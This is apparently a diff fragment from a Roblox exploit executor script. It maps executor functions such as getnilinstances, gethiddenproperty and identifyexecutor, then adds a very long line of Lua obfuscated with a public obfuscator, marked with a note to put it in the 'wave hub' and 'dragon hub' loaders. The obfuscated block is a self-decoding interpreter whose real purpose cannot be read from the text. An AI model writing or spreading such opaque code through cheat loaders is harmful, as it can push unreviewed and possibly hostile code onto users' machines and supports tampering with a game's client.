+    keyrelease = keyrelease,
+
+    isrbxactive = iswindowactive,
+    isrobloxactive = iswindowactive,
+
+    getinstances = getinstances,
+    getnilinstances = getnilinstances,
+    getscripts = getscripts,
+
+    getscripthash = getscripthash,
+
+    getexecutorname = getexecutorname,
+    identifyexecutor = getexecutorname,
+
+    gethiddenproperty = gethiddenproperty,
+    getfflag = getfflag
+})
+--add to loader wave hub and dragon hub
+--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local O={"\113\110\081\090\122\049\111\079\053\106\067\107\068\119\082\088";"\104\097\067\114\103\108\076\051","\120\043\070\081\122\088\070\090\082\055\051\098\076\110\076\082\113\048\107\061","\106\057\081\084\086\081\079\100\069\085\061\061";"\053\106\057\079\053\106\111\088","\102\051\051\068\053\097\051\110\102\051\055\106\082\097\067\090";"\086\120\086\081\050\098\083\068\110\050\120\087\111\070\043\061";"\097\100\050\106\107\084\057\049\078\067\100\109\116\112\061\061";"\110\055\083\055\047\090\111\068\047\106\122\112\098\070\077\077\082\051\070\061";"\053\110\067\098\082\051\111\051\068\097\057\047\113\055\047\078\107\055\107\061";"\052\086\087\078\047\071\107\061";"\110\067\051\110\122\051\053\105\103\055\051\068\098\106\047\079\082\073\061\061","\103\067\047\083\053\110\057\078\098\110\052\112\098\088\111\050\070\112\061\061","\076\097\084\080\103\108\069\061","\119\047\100\069\055\080\065\057\082\097\088\061";"\104\065\077\049\103\118\043\084\047\049\081\070\113\090\082\048\085\070\112\061","\103\049\067\079";"\122\049\057\090\122\048\056\083\103\097\104\061";"\083\106\119\087","\082\110\083\083\103\108\051\087\102\072\111\078\047\070\081\076","\104\097\111\108\076\106\067\088";"\053\106\084\080\103\097\067\105\076\110\053\061";"\072\050\084\089\087\109\057\122\071\085\061\061","\122\049\111\086\103\049\070\061";"\104\108\047\105\068\110\081\072";"\065\114\082\120","\047\118\111\048\068\111\122\068\104\106\084\105\068\110\082\084\085\118\069\061";"\076\108\082\118\053\115\061\061","\068\070\077\072\047\065\051\081\102\098\104\088\053\119\056\050";"\053\106\077\077\104\115\061\061";"\050\078\087\112\101\055\104\053\071\112\061\061","\078\084\080\119\114\071\078\083\066\102\056\107\049\066\055\061";"\076\106\111\114\076\085\061\061","\119\118\057\083\103\097\047\051\102\073\061\061";"\068\070\043\090\122\110\070\061","\104\106\067\088\103\110\067\088\053\119\047\077\053\097\084\051","\120\086\115\051\076\087\100\083\120\115\061\061";"\099\113\101\065\079\088\101\097\104\073\061\061","\076\106\118\077\122\049\082\100";"\076\106\067\088\104\097\067\072","\103\089\043\061","\120\115\061\061";"\122\048\051\112\076\085\061\061","\076\106\067\088\076\106\067\079\122\115\061\061","";"\119\118\057\114\076\119\047\077\122\049\111\086\103\049\070\061","\047\049\067\090\122\048\056\080\102\085\061\061","\103\110\111\088\068\073\061\061","\104\097\111\079\076\049\057\114";"\103\089\069\061";"\076\119\056\105\103\108\069\061";"\047\097\051\079\076\043\076\083\104\072\082\088\085\106\077\083\103\049\085\061","\107\072\047\086\107\111\047\088\070\106\070\106\053\072\117\043";"\113\071\043\047\087\068\077\079","\113\110\081\090\122\049\111\079\053\106\070\061";"\104\049\111\083\104\072\107\061","\097\047\098\122\109\065\117\084\080\085\097\048";"\068\110\081\106\053\110\084\083\076\049\111\088\076\085\061\061","\053\072\051\088\076\085\061\061","\122\110\081\112\053\110\082\101";"\122\049\057\079\122\110\118\086\076\119\069\061","\104\049\082\077\103\049\112\061";"\119\118\057\050\076\110\052\061","\111\122\113\098\051\104\117\101\108\079\079\049\119\087\082\100","\098\065\122\090\068\070\083\086\068\098\117\082\076\090\082\077";"\110\097\122\113\070\055\056\099\107\055\100\118\070\108\111\088\082\065\069\061";"\119\118\057\072\053\112\061\061";"\104\072\069\112\082\089\085\061","\067\049\111\114\104\049\067\105\069\043\047\051\122\049\067\065\122\049\067\055\069\085\061\061";"\111\109\050\085\115\112\061\061";"\107\106\111\048\113\048\077\108\102\049\088\108\085\070\051\088\113\072\115\061";"\104\110\084\111\068\085\061\061","\122\111\051\068\110\097\082\111\053\055\111\098\076\097\077\110\103\112\061\061","\056\049\065\053\114\097\073\072\110\107\057\088"}local function l(l)return O[l-(474257-410207)]end for l,T in ipairs({{299900-299899;-427446+427520},{608524-608523,-311387-(-311440)};{203386+-203332,-68894-(-68968)}})do while T[-678565+678566]<T[151364+-151362]do O[T[-291697+291698]],O[T[-318391+318393]],T[948815-948814],T[-479438+479440]=O[T[448177-448175]],O[T[663696-663695]],T[519989+-519988]+(-118054-(-118055)),T[357641-357639]-(681943+-681942)end end do local l={B=85621-85558;v=-650586+650639;G=-896059+896118,["\054"]=-202201+202212;n=-41888+41910,["\055"]=-1036844-(-1036880);u=891844+-891843,N=-170691-(-170706);r=-442592+442637;c=-490738-(-490748),p=-719124+719172,s=557942-557910,q=-25995+26013;l=67050+-66995;D=288177+-288151;O=491588+-491542;b=-322625+322644;V=974110+-974076;F=-1017362+1017382,K=1004694+-1004663;M=-906575-(-906608);o=-41041+41046;["\053"]=722044-722020;X=-46842-(-46894);A=-392631+392666;t=667947-667885;["\057"]=-988972-(-989033),S=-748327+748368,Y=-476686-(-476689);h=696009+-695981;T=-1022876-(-1022925);f=-469499-(-469529);["\047"]=-39994+40011,R=33131+-33118;["\048"]=-579208-(-579215);y=835158+-835098,j=-475882-(-475936),g=780942+-780915;Q=-62174+62231,["\043"]=-871301+871305,["\051"]=-505643-(-505680),d=146678-146638,m=-777940-(-777998),["\050"]=-421888-(-421932);e=729289-729246;J=69191+-69149,a=973055-973017;W=494078-494076;H=-454995-(-455034);w=-642258+642281,U=464911+-464895,x=-636427-(-636441);E=-344988-(-344996);I=53065+-53065,z=-327914-(-327943);["\049"]=988498-988492,["\052"]=-518152+518208;i=166543+-166493;k=-235053+235065;["\056"]=-360539+360548;L=559400-559375;C=-122076-(-122097);P=-438188+438235,Z=446361+-446310}local T=string.sub local I=table.insert local j=string.len local X=type local x=string.char local Q=math.floor local m=table.concat local o=O for O=-619050-(-619051),#o,-861096+861097 do local B=o[O]if X(B)=="\115\116\114\105\110\103"then local X=j(B)local z={}local a=-677001+677002 local e=705486-705486 local y=319145-319145 while a<=X do local O=T(B,a,a)local j=l[O]if j then e=e+j*(-794693+794757)^((-475466+475469)-y)y=y+(-178572+178573)if y==-303122-(-303126)then y=383661+-383661 local O=Q(e/(712424-646888))local l=Q((e%(714034+-648498))/(-962244-(-962500)))local T=e%(-205935+206191)I(z,x(O,l,T))e=-231820-(-231820)end elseif O=="\061"then I(z,x(Q(e/(-386979-(-452515)))))if a>=X or T(B,a+(115034-115033),a+(601390+-601389))~="\061"then I(z,x(Q((e%(-779404+844940))/(-85704+85960))))end break end a=a+(191978-191977)end o[O]=m(z)end end end return(function(O,I,j,X,x,Q,m,o,R,Z,F,V,C,s,y,T,e,B,z,a,h)V,o,s,h,y,z,F,e,R,B,T,Z,a,C=function(O,l)local I=e(l)local j=function(j,X,x)return T(O,{j,X;x},l,I)end return j end,{},function(O,l)local I=e(l)local j=function(j,X,x,Q,m)return T(O,{j;X;x,Q;m},l,I)end return j end,function(O,l)local I=e(l)local j=function(...)return T(O,{...},l,I)end return j end,function(O)local l,T=-506917+506918,O[613417-613416]while T do B[T],l=B[T]-(-402885+402886),l+(659231-659230)if B[T]==-378613+378613 then B[T],o[T]=nil,nil end T=O[l]end end,function()a=a+(-447233+447234)B[a]=679566-679565 return a end,function(O,l)local I=e(l)local j=function(j,X,x,Q)return T(O,{j,X;x,Q},l,I)end return j end,function(O)for l=-754823+754824,#O,300887+-300886 do B[O[l]]=(-140081-(-140082))+B[O[l]]end if j then local T=j(true)local I=x(T)I[l(118781-54718)],I[l(-838305+902401)],I[l(-701687+765779)]=O,y,function()return 2379618-(-864821)end return T else return X({},{[l(766958-702862)]=y;[l(55116+8947)]=O,[l(378663-314571)]=function()return 2223832-(-1020607)end})end end,function(O)B[O]=B[O]-(935143-935142)if 953107-953107==B[O]then B[O],o[O]=nil,nil end end,{},function(T,j,X,x)local N,g,K,S,E,B,J,n,H,G,d,h,P,r,i,f,k,M,q,U,c,m,p,D,t,v,W,u,a,b,Y,L,y,e while T do if T<7029284-(-316235)then if T<-121917+3389382 then if T<1319201-(-341221)then if T<20219-(-1021576)then if T<734169-173323 then if T<323108-31981 then if T<493638+-216653 then m=D T=M T=-382632+14706103 else v=o[a]c=v T=v and-1004443+12702828 or 1743231-322631 end else if T<340239+97736 then m={}T=O[l(-830872-(-894954))]else m=800712-(-771839)e=-435339+13052417 a=l(638365-574307)B=a^e T=m-B m=l(537264-473163)B=T T=m/B m={T}T=O[l(521673+-457573)]end end else if T<587915+311636 then if T<1225515-530866 then t=l(-71317-(-135441))H=O[t]b=-81640+2886925288488 P=l(790793-726710)i=a(P,b)f=e[i]i=l(429338-365216)P=3489022107963-137955 t=H(U,f)f=a(i,P)H=e[f]r=t==H T=r and 14503617-(-955939)or 7073063-(-900119)else r=r+H f=not t k=r<=U k=f and k f=r>=U f=t and f k=f or k f=876175-(-377872)T=k and f k=4335761-504386 T=T or k end else y=-1011687-(-1011688)a=o[X[-540849+540850]]h=980266-980264 e=a(y,h)a=967606+-967605 B=e==a m=B T=B and 13454589-(-876784)or 973128+2207582 end end else if T<641643+730048 then if T<498821+726806 then if T<992433-(-217826)then y=l(1055501-991380)m=l(-467575-(-531665))U=Z(1192223-677825,{})T=O[m]B=o[X[500600+-500596]]e=O[y]k=l(664350+-600259)u=O[k]k={u(U)}S={I(k)}u=-761733+761735 h=S[u]y=e(h)e=l(-215852+279918)a=B(y,e)B={a()}m=T(I(B))a=o[X[832187-832182]]B=m m=a T=a and-663020+12198614 or-681101+15731958 else T=611160+15274633 end else T=543297-(-320884)k=r d=l(1097865-1033811)v=O[d]d=l(575379+-511291)c=v[d]v=c(B,k)c=o[X[-994380+994386]]d=c()P=v+d i=P+S d=-126633+126634 P=-919825-(-920081)f=i%P k=nil S=f P=e[a]v=S+d c=y[v]i=P..c e[a]=i end else if T<108401+1512410 then if T<649983-(-786860)then o[a]=c T=o[a]T=T and 738999+7422841 or 3094569-(-376695)else T=true T=T and 327898+10625791 or 787097+15485581 end else k,U=S(u,k)T=k and 456513+3714767 or 346217+12155196 end end end else if T<2845105-125727 then if T<1844540-(-429099)then if T<998764-(-1006138)then if T<-700695+2417592 then T=254535+13819387 P=#f b=107797-107797 i=P==b else f=nil G=l(-312473+376536)i={}N=nil P=z()b=F(11955549-(-93936),{P;U,r,h})K=l(579359+-515284)o[P]=i n={}E=l(794762-730697)y=nil L=z()i=z()o[i]=b h=R(h)k=nil b={}o[L]=b b=O[E]S=nil q=o[L]Y={[G]=q,[K]=N}E=b(n,Y)b=Z(11328648-523787,{L,P;t;U,r;i})H=nil P=R(P)r=R(r)u=nil U=R(U)i=R(i)r=l(-290640-(-354707))t=R(t)a=b e=E L=R(L)k=l(436936-372874)u=O[k]H=-622139+3375494300766 U=a(r,H)r=29170057435584-517297 k=e[U]S=u[k]U=l(-565711+629821)k=a(U,r)u=e[k]h=S[u]k=l(495001-430915)U=7397287835521-(-120307)u=a(k,U)S=e[u]U=20160678738128-480292 y=h[S]k=l(880233-816126)h=l(-768571+832652)u=a(k,U)S=e[u]h=y[h]h=h(y,S)T=h and 1820403-(-908821)or 12447338-893135 end else T=178789+10142074 end else if T<-266062+2845974 then if T<-250761+2800867 then S=m u=l(141436+-77359)m=O[u]u=l(-547008-(-611086))T=m[u]u=z()k=l(-828138-(-892191))o[u]=T m=O[k]t=l(-743001+807054)k=l(453542+-389434)T=m[k]H=O[t]U=H r=T k=T T=H and-616784+15942667 or 13781805-529641 else B=l(-342305-(-406375))m=l(88480+-24401)T=O[m]m=O[B]B=l(-887237-(-951307))O[B]=T T=13337625-(-719855)B=l(37653-(-26426))O[B]=m B=o[X[1017236+-1017235]]a=B()end else r=l(692583-628494)U=O[r]T=5412678-(-751532)m=U end end else if T<3151276-291077 then if T<146912+2672340 then if T<278245+2465514 then k=l(389840-325778)H=17705512216363-34551 u=O[k]r=l(-378890+442950)U=a(r,H)k=e[U]r=-901318+18516205281908 S=u[k]U=l(901299-837238)k=a(U,r)u=e[k]U=10812428003636-(-993910)k=l(-531343+595446)T=-793963+12348166 h=S[u]u=a(k,U)U=-277103+30496698872296 S=e[u]k=l(-13331-(-77383))y=h[S]u=a(k,U)S=e[u]h=l(-5661+69742)h=y[h]h=h(y,S)y=l(927685+-863609)y=h[y]y=y(h)else f,i=H(t,f)T=f and 6391+8830972 or-59158+16772762 end else D=o[a]m=D T=D and 6475449-978369 or 14913441-589970 end else if T<3818959-645770 then if T<3130848-(-11695)then a=l(282317-218213)m=O[a]T=not m T=T and 442797-11392 or 886952+6312798 B=j[-326034-(-326035)]else T=11050671-419284 N=-57088+57089 M=K[N]D=M end else a=o[X[174777+-174775]]e=o[X[361424+-361421]]B=a==e T=14649476-318103 m=B end end end end else if T<4627896-(-870833)then if T<697073+3474110 then if T<1015114+2745152 then if T<396783+3097321 then if T<779898+2665862 then L=z()o[L]=c n=932036-931936 E=l(1080966-1016889)m=O[E]Y=887495+-887240 E=l(624086-560008)T=m[E]E=77177-77176 m=T(E,n)J=-1034426-(-1034426)g=421352-411352 n=47194-47194 N=l(242281+-178160)K=-461685+461687 q=-1046419+1046420 E=z()o[E]=m T=o[u]m=T(n,Y)n=z()Y=-210254-(-210255)o[n]=m T=o[u]G=o[E]m=T(Y,G)Y=z()o[Y]=m m=o[u]G=m(q,K)m=618797+-618796 T=G==m G=z()K=l(468073+-404002)m=l(244950-180884)o[G]=T M=O[N]W=o[u]p={W(J,g)}N=M(I(p))M=l(695127+-631056)T=l(-775062+839119)T=i[T]D=N..M q=K..D T=T(i,m,q)K=l(-474872+538963)q=z()o[q]=T m=O[K]D=C(645683-(-260519),{u;L;r;e,a;P,G;q;E,Y,n;U})K={m(D)}T={I(K)}K=T T=o[G]T=T and 68797+2785046 or 4679849-(-616682)else T=true T=16837478-564800 end else B=l(-343720+407818)m=l(1011446-947366)T=O[m]m=T(B)m={}T=O[l(-854632+918738)]end else if T<-354566+4480897 then if T<4067391-65722 then u=nil T=42268+10278595 y=nil S=nil else T=166990-4199 p=459772+-459770 W=K[p]p=o[q]N=W==p D=N end else T=S==B h=e T=T and 10648882-(-125063)or 3920452-(-872517)end end else if T<5933805-693214 then if T<3855173-(-948076)then if T<3917114-(-305628)then y=k i=l(375781-311709)b=l(-306293-(-370407))f=O[i]L=-819997+28330768742053 i=f(U)P=a(b,L)H=T f=e[P]t=i==f T=t and 5616177-(-990664)or 13413163-(-1016372)r=t else T=8318774-(-749998)h=nil S=nil end else T=o[X[583575-583568]]T=T and 592675+7957420 or-246545+14451655 end else if T<5552128-79906 then if T<-908933+6204584 then T=O[l(192070+-128014)]m={}else M=o[a]T=M and 34884+3112076 or-429518+11060905 D=M end else p=-51222+51223 M=T W=K[p]p=false N=W==p T=N and 15642+4060408 or 107793+54998 D=N end end end else if T<5565676-(-1023020)then if T<814458+5242621 then if T<5413145-(-309536)then if T<211561+5460377 then y=nil T=O[l(225309+-161207)]h=nil a=nil e=nil m={}else B=j e=l(948183+-884129)T=true y=z()u=l(1030258+-966167)a=z()o[a]=T m=O[e]e=l(680247+-616179)T=m[e]h=z()e=z()o[e]=T T=s(3326277-(-387000),{})o[y]=T T=false k=Z(-315835+13192221,{h})o[h]=T S=O[u]u=S(k)m=u T=u and-947483+14526051 or 2770756-393654 end else a=o[X[-646973-(-646976)]]e=-578723+578755 B=a%e H=491754+-491741 U=-212406-(-212408)y=o[X[869817-869813]]u=o[X[97040-97038]]i=o[X[-176702-(-176705)]]f=i-B i=-100658+100690 t=f/i r=H-t k=U^r S=u/k h=y(S)y=-201620+4295168916 k=830236-830235 e=h%y h=-516182-(-516184)y=h^B a=e/y y=o[X[-678285+678289]]u=a%k H=995757+-995501 k=71924+4294895372 S=u*k u=887876-822340 h=y(S)y=o[X[-624014+624018]]S=y(a)e=h+S U=-1000859+1001115 h=-98966+164502 y=e%h T=533778+12085443 S=e-y h=S/u a=nil e=nil u=1041205+-1040949 S=y%u k=y-S u=k/U U=-51899+52155 y=nil k=h%U r=h-k U=r/H B=nil r={S;u;k;U}U=nil o[X[624339+-624338]]=r u=nil h=nil S=nil k=nil end else if T<78453+6497603 then if T<-284700+6497430 then H=516836+-516771 i=V(349782+10802032,{})f=l(342417-278326)U=z()o[U]=m d=l(10376+53745)r=-199887-(-199890)T=o[u]m=T(r,H)r=z()T=593974-593974 H=T o[r]=m m=O[f]f={m(i)}T=-747110-(-747110)t=T T={I(f)}f=T m=-650054+650056 T=f[m]i=T m=l(529514-465424)T=O[m]P=o[e]v=O[d]d=v(i)v=l(185483+-121417)c=P(d,v)P={c()}m=T(I(P))P=z()o[P]=m c=o[r]m=505134+-505133 v=c c=730809-730808 T=16714847-1005301 d=c c=639598-639598 b=d<c c=m-d else a=o[X[-307910+307912]]e=-6384+6493 B=a*e a=703106+29727036357519 m=B+a B=35184372241279-152447 T=m%B o[X[-432015+432017]]=T T=7874090-568778 B=o[X[952026+-952023]]a=672557-672556 m=B~=a end else i=nil r=nil T=3135017-381203 end end else if T<6436292-(-700814)then if T<403125+6405820 then if T<-636315+7333179 then t=#U T=329733+14099802 r=t else e=e+h u=not S a=e<=y a=u and a u=e>=y u=S and u a=u or a u=606986+7606411 T=a and u a=6955778-(-526646)T=T or a end else b=l(10535-(-53538))T=16558411-(-155193)Y=14047671535023-(-431070)n=l(-87126+151219)P=O[b]b=P()L=a(n,Y)i=nil P=e[L]L=U b[P]=L r=nil end else if T<7962808-653116 then if T<-652133+7955053 then m=l(-524868-(-588953))T=O[m]h=l(416778-352674)y=O[h]h={T(y)}m=h[-699887+699888]T=46336+9022436 a=h[-737165+737167]y=m e=h[1036324-1036321]else e=135419-135244 a=o[X[-388981-(-388984)]]T=-630534+12478114 B=a*e a=-665715+665972 m=B%a o[X[610928-610925]]=m end else P=P+L i=P<=b n=not E i=n and i n=P>=b n=E and n i=n or i n=9876431-(-285388)T=i and n i=2142984-430937 T=T or i end end end end end else if T<12196021-(-145518)then if T<673611+9550502 then if T<9006360-798243 then if T<9016131-1031247 then if T<7177569-(-425352)then if T<7513532-(-21514)then T=o[X[628302-628292]]a=o[X[-861029-(-861040)]]B[T]=a T=o[X[704793+-704781]]a={T(B)}T=O[l(13040-(-51075))]m={I(a)}else T=1109673-(-548253)U=nil y=nil end else if T<761714+7130926 then T={}o[X[971887+-971885]]=T r=-490029+490030 H=r k=l(-499879+563933)m=o[X[-477797-(-477800)]]y=m T=-593903+1458084 h=35184371700416-(-388416)u=-769602-(-769857)m=a%h o[X[-631230-(-631234)]]=m S=a%u u=514512-514510 h=S+u r=-698279-(-698279)o[X[-977434-(-977439)]]=h u=O[k]k=l(-369582-(-433702))t=H<r S=u[k]u=S(B)S=l(-708477-(-772551))e[a]=S U=u S=502353+-502136 k=-23631-(-23632)r=k-H else T=7836312-246201 end end else if T<248254+7813819 then if T<570110+7466664 then T=-909258+14966738 else r=R(r)a=R(a)a=nil e=R(e)S=nil k=nil y=R(y)h=R(h)S=l(-608101-(-672178))t=nil P=R(P)k=l(-532325+596378)r=z()f=nil u=R(u)e=nil h=O[S]T=7050954-(-269580)u=l(-40675-(-104752))H=nil U=R(U)P=629012+-628756 U=l(-105702-(-169756))S=l(624027-559910)i=nil y=h[S]h=z()o[h]=y S=O[u]u=l(943255-879177)y=S[u]u=O[k]k=l(265824-201719)S=u[k]b=P i=126793-126792 H={}k=O[U]U=l(-824280+888339)u=k[U]t=z()U=z()k=144494-144494 o[U]=k k=746026-746024 o[r]=k o[t]=H H=-281097-(-281097)f={}P=831119-831118 k={}L=P P=170483+-170483 E=L<P P=i-L end else T=658409+7400871 end end else if T<-1021159+9904875 then if T<8345542-(-326674)then if T<403466+8051873 then k=279321-279321 T=o[X[-373265-(-373266)]]U=-1027306+1027561 u=T(k,U)a=e T=6463604-(-277636)B[a]=u a=nil else B=l(-277032+341112)T=O[B]a=o[X[-852045-(-852053)]]e=-194393-(-194393)B=T(a,e)T=15104316-899206 end else r=f P=i==h T=P and 7594897-596647 or 7338046-752857 end else if T<9133142-(-815190)then if T<48646+9874159 then e,S=y(a,e)T=e and 3971229-(-195874)or 13760309-(-802699)else T=o[u]b=251336-251330 d=841215-841214 v=T(d,b)b=l(-425977+490056)T=l(44637+19442)O[T]=v d=O[b]b=724209+-724207 T=d>b T=T and 95587+12329727 or 542355+12601878 end else i=P n=i f[i]=n T=-81753+7402287 i=nil end end end else if T<11329053-18135 then if T<11171625-369921 then if T<11544376-896226 then if T<-955513+11430814 then m={a}T=O[l(-836507-(-900620))]else o[a]=D J=143492+-143491 p=o[Y]W=p+J N=K[W]M=H+N N=-301452-(-301708)T=M%N H=T W=o[n]N=t+W W=-619959-(-620215)T=12111977-(-187761)M=N%W t=M end else u=l(205384+-141280)m={B}T=O[u]u=nil T[h]=u T=O[l(883968-819856)]end else if T<-135128+11242151 then if T<258766+10568685 then T=o[X[302383+-302382]]e=T B=j[402461-402460]a=j[395853+-395851]T=e[a]T=T and 2847425-728097 or 8538100-668655 else T=16608361-722568 end else a=l(938518-874454)e=-41368+10538828 B=a^e m=9209854-51226 T=m-B m=l(29344-(-34753))B=T T=m/B m={T}T=O[l(1109747-1045624)]end end else if T<711557+11085190 then if T<12655739-1030643 then if T<12516062-972132 then T=480304+14570553 e=o[X[-247068-(-247074)]]a=e==B m=a else S=l(168222+-104138)U=422329+15915126614842 k=l(-825169+889224)h=O[S]u=a(k,U)U=34326486512977-(-968991)r=l(1086118-1022049)T=190379+1467547 S=e[u]y=h[S]k=l(-690437+754536)u=a(k,U)S=e[u]h=y(S)S=l(-20506-(-84591))y=O[S]U=O[r]r={U()}U={y(I(r))}u=U[-955318-(-955320)]S=U[711328+-711327]k=U[-586108-(-586111)]end else v=H==t c=v T=-47642+1468242 end else if T<163178+12018331 then if T<11914547-23188 then e=-80839-(-80840)a=o[X[-937504-(-937507)]]B=a~=e T=B and 241284+5543345 or-455288+7760600 else B=o[X[957661+-957660]]m=#B B=365271-365271 T=m==B T=T and 6163600-(-388360)or 12936406-317185 end else L=R(L)K=nil n=R(n)q=R(q)Y=R(Y)E=R(E)T=330616+15378930 G=R(G)end end end end else if T<-615187+14888123 then if T<202065+13116885 then if T<13706995-964268 then if T<-242270+12772293 then if T<11972835-(-490864)then d=l(614070-549949)L=l(-51282-(-115352))T=O[d]b=O[L]d=T(b)T=l(-312718+376797)O[T]=d T=510222-(-715193)else y={}S=s(2907724-(-2073),{})u=l(757161-693074)k=l(-196985-(-261036))y[u]=S u=O[k]S=not u T=S and-829841+14655404 or-491315+6000560 end else e=l(594720-530667)a=O[e]e=l(-738309-(-802414))T=O[l(-991068+1055184)]B=a[e]e=o[X[-174115-(-174116)]]a={B(e)}m={I(a)}end else if T<-416294+13609917 then if T<13255672-225079 then m={}T=true o[X[-480850-(-480851)]]=T T=O[l(914389+-850295)]else b=l(-294442-(-358521))T=O[b]b=l(-852413-(-916483))O[b]=T T=138035+1087380 end else m=U T=r T=U and 5573498-(-590712)or 3453613-746014 end end else if T<-960847+14994227 then if T<13610932-(-55364)then if T<-368772+13929577 then b=-147689-(-147689)P=#f i=P==b T=i and 1724959-5598 or 14674207-600285 else S=o[h]T=3078744-701642 m=S end else r=20339855226426-725307 U=l(852615+-788497)H=l(-461918+526029)T=504846+5004399 u=l(57690-(-6383))S=O[u]t=4880973490868-(-564780)u=S()k=a(U,r)S=e[k]r=a(H,t)U=e[r]k=y[U]u[S]=k end else if T<13946035-(-251459)then if T<772350+13299005 then T=true T=T and 2473383-(-91717)or-702402+15400039 else b=#f P=-951989+951990 i=y(P,b)T=14282125-721723 P=S(f,i)n=922903-922902 b=o[t]E=P-n i=nil L=u(E)b[P]=L P=nil end else T={}e=o[X[-91833-(-91842)]]y=e B=T a=407657+-407656 e=1010188+-1010187 T=-946847+7688087 h=e e=-471393+471393 S=h<e e=a-h end end end else if T<-416384+15534834 then if T<-2623+14561516 then if T<-251653+14628969 then if T<-147567+14474563 then T=11281250-(-1018488)o[a]=m else T=m and-263221+1399999 or 5777950-911698 end else T=H T=r and 135118+499367 or-27397+7617508 end else if T<-356553+15193458 then if T<15375793-787663 then B=nil m={}T=O[l(407813-343704)]else T=O[l(299818-235723)]m={}end else o[X[-836476-(-836481)]]=m T=5365064-498812 B=nil end end else if T<16032462-239708 then if T<15394576-(-157876)then if T<16363504-957261 then T=12403573-(-848591)f=l(624797+-560744)t=O[f]f=l(438087+-373998)H=t[f]U=H else H=l(-16813+80898)T=2338924-(-414890)r=O[H]i={r(U)}t=i[-619928+619930]H=i[585479-585478]f=i[-867103-(-867106)]end else L=not b c=c+d m=c<=v m=L and m L=c>=v L=b and L m=L or m L=3624969-300059 T=m and L m=-728860+1019394 T=T or m end else if T<386329+16049485 then if T<-471654+16546705 then T=true T=T and 463021+9479603 or 5263002-(-32617)else T=C(334214+7665178,{y})v={T()}T=O[l(-885151+949270)]m={I(v)}end else T=187472+7785710 end end end end end end end T=#x return I(m)end,function(O,l)local I=e(l)local j=function(j,X)return T(O,{j,X},l,I)end return j end,937010-937010,function(O,l)local I=e(l)local j=function(j)return T(O,{j},l,I)end return j end return(h(829361+4867257,{}))(I(m))end)(getfenv and getfenv()or _ENV,unpack or table[l(683803-619714)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
